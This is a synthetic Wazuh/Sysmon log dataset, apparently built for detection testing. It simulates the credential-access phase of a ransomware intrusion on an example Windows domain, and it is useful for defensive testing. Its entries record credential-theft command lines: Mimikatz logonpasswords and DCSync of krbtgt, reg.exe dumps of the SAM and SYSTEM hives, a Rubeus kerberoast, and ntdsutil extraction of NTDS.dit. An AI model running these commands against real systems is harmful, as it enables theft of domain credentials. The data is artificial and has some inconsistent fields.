{
  "_metadata": {
    "engagement": "ransomware",
    "phase": "credential-access",
    "phase_number": 5,
    "description": "Credential Access phase of Ransomware - example-corp",
    "techniques": [
      "T1003.001",
      "T1003.002",
      "T1558.003",
      "T1003.003",
      "T1003.006"
    ],
    "timespan": "T+6:26:00 to T+7:05:00",
    "attacker_logic": "Attacker executes credential-access techniques",
    "format": "wazuh-native",
    "format_version": "2.0"
  },
  "attacker_profile": {
    "c2_server": "185.141.27.98",
    "initial_target": "WS01.corp.local",
    "compromised_user": "CORP\\jsmith"
  },
  "logs": [
    {
      "_comment": "LSASS memory access for credential dumping (Sysmon)",
      "sequence": 1,
      "relative_time": "T+6:26:00",
      "timestamp": "2026-01-30T14:26:00Z",
      "log": {
        "winlog": {
          "channel": "Microsoft-Windows-Sysmon/Operational",
          "event_id": 10,
          "provider_name": "Microsoft-Windows-Sysmon",
          "computer_name": "WORKSTATION01.example.local",
          "event_data": {
            "RuleName": "technique_id=T1003,technique_name=Credential Dumping",
            "UtcTime": "2026-01-30 11:52:44.395",
            "SourceProcessGUID": "{C257A465-WS01-0028-C98E03248F9B}",
            "SourceProcessId": "3827",
            "SourceThreadId": "3827",
            "SourceImage": "C:\\Windows\\System32\\rundll32.exe",
            "TargetProcessGUID": "{00000000-0000-0000-0000-000000000728}",
            "TargetProcessId": "728",
            "TargetImage": "C:\\Windows\\System32\\lsass.exe",
            "GrantedAccess": "0x1FFFFF",
            "CallTrace": "C:\\Windows\\SYSTEM32\\ntdll.dll+9d4c4|C:\\Windows\\System32\\KERNELBASE.dll+2bcce|C:\\Windows\\System32\\comsvcs.dll+...",
            "SourceUser": "EXAMPLE\\mjones",
            "TargetUser": "NT AUTHORITY\\SYSTEM"
          }
        },
        "agent": {
          "name": "WS01",
          "id": "007"
        },
        "timestamp": "2026-01-30T14:26:00.000+0000",
        "_fomorian_test": true,
        "_fomorian_engagement": "ransomware",
        "_fomorian_phase": "credential-access"
      }
    },
    {
      "_comment": "LSASS memory access for credential dumping (Security)",
      "sequence": 2,
      "relative_time": "T+6:27:00",
      "timestamp": "2026-01-30T14:27:00Z",
      "log": {
        "winlog": {
          "channel": "Security",
          "event_id": 4663,
          "provider_name": "Microsoft-Windows-Security-Auditing",
          "computer_name": "WORKSTATION01.example.local",
          "event_data": {
            "SubjectUserSid": "S-1-5-21-1234567890-1234567890-1234567890-500",
            "SubjectUserName": "mjones",
            "SubjectDomainName": "EXAMPLE",
            "SubjectLogonId": "0x3E7",
            "ObjectServer": "Security",
            "ObjectType": "Process",
            "ObjectName": "\\Device\\HarddiskVolume2\\Windows\\System32\\lsass.exe",
            "HandleId": "0x2a8",
            "AccessList": "%%4416\n\t\t\t\t%%4432\n\t\t\t\t%%4423",
            "AccessMask": "0x1FFFFF",
            "ProcessId": "0xEF3",
            "ProcessName": "C:\\Windows\\System32\\rundll32.exe"
          }
        },
        "agent": {
          "name": "WS01",
          "id": "007"
        },
        "timestamp": "2026-01-30T14:27:00.000+0000",
        "_fomorian_test": true,
        "_fomorian_engagement": "ransomware",
        "_fomorian_phase": "credential-access"
      }
    },
    {
      "_comment": "Mimikatz sekurlsa::logonpasswords",
      "sequence": 3,
      "relative_time": "T+6:28:30",
      "timestamp": "2026-01-30T14:28:30Z",
      "log": {
        "winlog": {
          "channel": "Microsoft-Windows-Sysmon/Operational",
          "event_id": 1,
          "provider_name": "Microsoft-Windows-Sysmon",
          "computer_name": "WORKSTATION01.example.local",
          "event_data": {
            "UtcTime": "2026-01-30 11:52:57.739",
            "ProcessGuid": "{C257A465-WS01-0029-1249820BE325}",
            "ProcessId": "3971",
            "Image": "C:\\Users\\Public\\mimikatz.exe",
            "CommandLine": "mimikatz.exe privilege::debug sekurlsa::logonpasswords exit",
            "CurrentDirectory": "C:\\Users\\Public\\",
            "User": "EXAMPLE\\mjones",
            "IntegrityLevel": "System",
            "Hashes": "SHA256=912CE59CBE68A3E5C9D6E2B9B1C4D5A6E7F8B9C0D1E2F3A4B5C6D7E8F9A0B1C2",
            "ParentProcessGuid": "{C257A465-WS01-0028-C98E03248F9B}",
            "ParentProcessId": "3827",
            "ParentImage": "C:\\Windows\\System32\\cmd.exe"
          }
        },
        "agent": {
          "name": "WS01",
          "id": "007"
        },
        "timestamp": "2026-01-30T14:28:30.000+0000",
        "_fomorian_test": true,
        "_fomorian_engagement": "ransomware",
        "_fomorian_phase": "credential-access"
      }
    },
    {
      "_comment": "Mimikatz LSASS access",
      "sequence": 4,
      "relative_time": "T+6:30:30",
      "timestamp": "2026-01-30T14:30:30Z",
      "log": {
        "winlog": {
          "channel": "Microsoft-Windows-Sysmon/Operational",
          "event_id": 10,
          "provider_name": "Microsoft-Windows-Sysmon",
          "computer_name": "WORKSTATION01.example.local",
          "event_data": {
            "RuleName": "technique_id=T1003,technique_name=Credential Dumping",
            "UtcTime": "2026-01-30 11:52:57.739",
            "SourceProcessGUID": "{C257A465-WS01-0029-1249820BE325}",
            "SourceProcessId": "3971",
            "SourceThreadId": "3971",
            "SourceImage": "C:\\Users\\Public\\mimikatz.exe",
            "TargetProcessGUID": "{00000000-0000-0000-0000-000000000728}",
            "TargetProcessId": "728",
            "TargetImage": "C:\\Windows\\System32\\lsass.exe",
            "GrantedAccess": "0x1010",
            "CallTrace": "C:\\Windows\\SYSTEM32\\ntdll.dll+9d4c4|C:\\Users\\Public\\mimikatz.exe+1a234",
            "SourceUser": "EXAMPLE\\mjones",
            "TargetUser": "NT AUTHORITY\\SYSTEM"
          }
        },
        "agent": {
          "name": "WS01",
          "id": "007"
        },
        "timestamp": "2026-01-30T14:30:30.000+0000",
        "_fomorian_test": true,
        "_fomorian_engagement": "ransomware",
        "_fomorian_phase": "credential-access"
      }
    },
    {
      "_comment": "SAM database dump via reg.exe",
      "sequence": 5,
      "relative_time": "T+6:33:00",
      "timestamp": "2026-01-30T14:33:00Z",
      "log": {
        "winlog": {
          "channel": "Microsoft-Windows-Sysmon/Operational",
          "event_id": 1,
          "provider_name": "Microsoft-Windows-Sysmon",
          "computer_name": "WORKSTATION01.example.local",
          "event_data": {
            "UtcTime": "2026-01-30 11:53:12.731",
            "ProcessGuid": "{C257A465-WS01-0030-E2CC5A1328F4}",
            "ProcessId": "4011",
            "Image": "C:\\Windows\\System32\\reg.exe",
            "CommandLine": "reg save HKLM\\SAM C:\\Users\\Public\\sam.save",
            "CurrentDirectory": "C:\\Windows\\System32\\",
            "User": "NT AUTHORITY\\SYSTEM",
            "IntegrityLevel": "System",
            "ParentProcessGuid": "{C257A465-WS01-0029-1249820BE325}",
            "ParentProcessId": "3971",
            "ParentImage": "C:\\Windows\\System32\\cmd.exe"
          }
        },
        "agent": {
          "name": "WS01",
          "id": "007"
        },
        "timestamp": "2026-01-30T14:33:00.000+0000",
        "_fomorian_test": true,
        "_fomorian_engagement": "ransomware",
        "_fomorian_phase": "credential-access"
      }
    },
    {
      "_comment": "SYSTEM hive dump via reg.exe",
      "sequence": 6,
      "relative_time": "T+6:36:00",
      "timestamp": "2026-01-30T14:36:00Z",
      "log": {
        "winlog": {
          "channel": "Microsoft-Windows-Sysmon/Operational",
          "event_id": 1,
          "provider_name": "Microsoft-Windows-Sysmon",
          "computer_name": "WORKSTATION01.example.local",
          "event_data": {
            "UtcTime": "2026-01-30 11:53:12.731",
            "ProcessGuid": "{C257A465-WS01-0031-AE317169D5F9}",
            "ProcessId": "4011",
            "Image": "C:\\Windows\\System32\\reg.exe",
            "CommandLine": "reg save HKLM\\SYSTEM C:\\Users\\Public\\system.save",
            "CurrentDirectory": "C:\\Windows\\System32\\",
            "User": "NT AUTHORITY\\SYSTEM",
            "IntegrityLevel": "System",
            "ParentProcessGuid": "{C257A465-WS01-0029-1249820BE325}",
            "ParentProcessId": "3971",
            "ParentImage": "C:\\Windows\\System32\\cmd.exe"
          }
        },
        "agent": {
          "name": "WS01",
          "id": "007"
        },
        "timestamp": "2026-01-30T14:36:00.000+0000",
        "_fomorian_test": true,
        "_fomorian_engagement": "ransomware",
        "_fomorian_phase": "credential-access"
      }
    },
    {
      "_comment": "Kerberoasting via Rubeus",
      "sequence": 7,
      "relative_time": "T+6:39:30",
      "timestamp": "2026-01-30T14:39:30Z",
      "log": {
        "winlog": {
          "channel": "Microsoft-Windows-Sysmon/Operational",
          "event_id": 1,
          "provider_name": "Microsoft-Windows-Sysmon",
          "computer_name": "WORKSTATION01.example.local",
          "event_data": {
            "UtcTime": "2026-01-30 11:53:27.116",
            "ProcessGuid": "{C257A465-WS01-0032-2FC4AFCFED55}",
            "ProcessId": "4270",
            "Image": "C:\\Users\\Public\\Rubeus.exe",
            "CommandLine": "Rubeus.exe kerberoast /outfile:C:\\Users\\Public\\hashes.txt",
            "CurrentDirectory": "C:\\Users\\Public\\",
            "User": "EXAMPLE\\jsmith",
            "IntegrityLevel": "High",
            "Hashes": "SHA256=ABCD1234EF5678901234567890ABCDEF1234567890ABCDEF1234567890ABCDEF",
            "ParentProcessGuid": "{C257A465-WS01-0031-AE317169D5F9}",
            "ParentProcessId": "4193",
            "ParentImage": "C:\\Windows\\System32\\cmd.exe"
          }
        },
        "agent": {
          "name": "WS01",
          "id": "007"
        },
        "timestamp": "2026-01-30T14:39:30.000+0000",
        "_fomorian_test": true,
        "_fomorian_engagement": "ransomware",
        "_fomorian_phase": "credential-access"
      }
    },
    {
      "_comment": "Kerberoasting TGS request to DC",
      "sequence": 8,
      "relative_time": "T+6:43:30",
      "timestamp": "2026-01-30T14:43:30Z",
      "log": {
        "winlog": {
          "channel": "Microsoft-Windows-Sysmon/Operational",
          "event_id": 3,
          "provider_name": "Microsoft-Windows-Sysmon",
          "computer_name": "WORKSTATION01.example.local",
          "event_data": {
            "UtcTime": "2026-01-30 11:53:27.116",
            "ProcessGuid": "{C257A465-WS01-0032-2FC4AFCFED55}",
            "ProcessId": "4270",
            "Image": "C:\\Users\\Public\\Rubeus.exe",
            "User": "EXAMPLE\\jsmith",
            "Protocol": "tcp",
            "Initiated": "true",
            "SourceIp": "10.1.1.50",
            "SourcePort": "57058",
            "DestinationIp": "192.168.1.1",
            "DestinationHostname": "DC01",
            "DestinationPort": "88"
          }
        },
        "agent": {
          "name": "WS01",
          "id": "007"
        },
        "timestamp": "2026-01-30T14:43:30.000+0000",
        "_fomorian_test": true,
        "_fomorian_engagement": "ransomware",
        "_fomorian_phase": "credential-access"
      }
    },
    {
      "_comment": "DCSync attack (Mimikatz lsadump::dcsync)",
      "sequence": 9,
      "relative_time": "T+6:48:00",
      "timestamp": "2026-01-30T14:48:00Z",
      "log": {
        "winlog": {
          "channel": "Microsoft-Windows-Sysmon/Operational",
          "event_id": 1,
          "provider_name": "Microsoft-Windows-Sysmon",
          "computer_name": "WORKSTATION01.example.local",
          "event_data": {
            "UtcTime": "2026-01-30 11:56:52.625",
            "ProcessGuid": "{C257A465-WS01-0034-71BAC770B7F6}",
            "ProcessId": "4492",
            "Image": "C:\\Users\\Public\\mimikatz.exe",
            "CommandLine": "mimikatz.exe \"lsadump::dcsync /domain:example.local /user:krbtgt\" exit",
            "CurrentDirectory": "C:\\Users\\Public\\",
            "User": "EXAMPLE\\mjones",
            "IntegrityLevel": "High",
            "ParentProcessGuid": "{C257A465-WS01-0033-8BF13C781180}",
            "ParentProcessId": "4378",
            "ParentImage": "C:\\Windows\\System32\\cmd.exe"
          }
        },
        "agent": {
          "name": "WS01",
          "id": "007"
        },
        "timestamp": "2026-01-30T14:48:00.000+0000",
        "_fomorian_test": true,
        "_fomorian_engagement": "ransomware",
        "_fomorian_phase": "credential-access"
      }
    },
    {
      "_comment": "DCSync LDAP connection to DC",
      "sequence": 10,
      "relative_time": "T+6:53:00",
      "timestamp": "2026-01-30T14:53:00Z",
      "log": {
        "winlog": {
          "channel": "Microsoft-Windows-Sysmon/Operational",
          "event_id": 3,
          "provider_name": "Microsoft-Windows-Sysmon",
          "computer_name": "WORKSTATION01.example.local",
          "event_data": {
            "UtcTime": "2026-01-30 11:56:52.625",
            "ProcessGuid": "{C257A465-WS01-0034-71BAC770B7F6}",
            "ProcessId": "4492",
            "Image": "C:\\Users\\Public\\mimikatz.exe",
            "User": "EXAMPLE\\mjones",
            "Protocol": "tcp",
            "Initiated": "true",
            "SourceIp": "10.1.1.50",
            "SourcePort": "53636",
            "DestinationIp": "192.168.1.1",
            "DestinationHostname": "DC01",
            "DestinationPort": "389"
          }
        },
        "agent": {
          "name": "WS01",
          "id": "007"
        },
        "timestamp": "2026-01-30T14:53:00.000+0000",
        "_fomorian_test": true,
        "_fomorian_engagement": "ransomware",
        "_fomorian_phase": "credential-access"
      }
    },
    {
      "_comment": "NTDS.dit extraction via ntdsutil",
      "sequence": 11,
      "relative_time": "T+6:58:30",
      "timestamp": "2026-01-30T14:58:30Z",
      "log": {
        "winlog": {
          "channel": "Microsoft-Windows-Sysmon/Operational",
          "event_id": 1,
          "provider_name": "Microsoft-Windows-Sysmon",
          "computer_name": "DC01.example.local",
          "event_data": {
            "UtcTime": "2026-01-30 11:56:57.094",
            "ProcessGuid": "{C257A465-DC01-0035-60066C5C43AB}",
            "ProcessId": "4551",
            "Image": "C:\\Windows\\System32\\ntdsutil.exe",
            "CommandLine": "ntdsutil \"ac i ntds\" \"ifm\" \"create full C:\\temp\\ntds\" q q",
            "CurrentDirectory": "C:\\Windows\\System32\\",
            "User": "NT AUTHORITY\\SYSTEM",
            "IntegrityLevel": "System",
            "ParentProcessGuid": null,
            "ParentProcessId": "",
            "ParentImage": "C:\\Windows\\System32\\cmd.exe"
          }
        },
        "agent": {
          "name": "DC01",
          "id": "003"
        },
        "timestamp": "2026-01-30T14:58:30.000+0000",
        "_fomorian_test": true,
        "_fomorian_engagement": "ransomware",
        "_fomorian_phase": "credential-access"
      }
    },
    {
      "_comment": "NTDS.dit file created",
      "sequence": 12,
      "relative_time": "T+7:04:30",
      "timestamp": "2026-01-30T15:04:30Z",
      "log": {
        "winlog": {
          "channel": "Microsoft-Windows-Sysmon/Operational",
          "event_id": 11,
          "provider_name": "Microsoft-Windows-Sysmon",
          "computer_name": "DC01.example.local",
          "event_data": {
            "UtcTime": "2026-01-30 11:56:57.094",
            "ProcessGuid": "{C257A465-DC01-0035-60066C5C43AB}",
            "ProcessId": "4551",
            "Image": "C:\\Windows\\System32\\ntdsutil.exe",
            "TargetFilename": "C:\\temp\\ntds\\Active Directory\\ntds.dit",
            "CreationUtcTime": "2026-01-30 11:56:57.094",
            "User": "NT AUTHORITY\\SYSTEM"
          }
        },
        "agent": {
          "name": "DC01",
          "id": "003"
        },
        "timestamp": "2026-01-30T15:04:30.000+0000",
        "_fomorian_test": true,
        "_fomorian_engagement": "ransomware",
        "_fomorian_phase": "credential-access"
      }
    }
  ]
}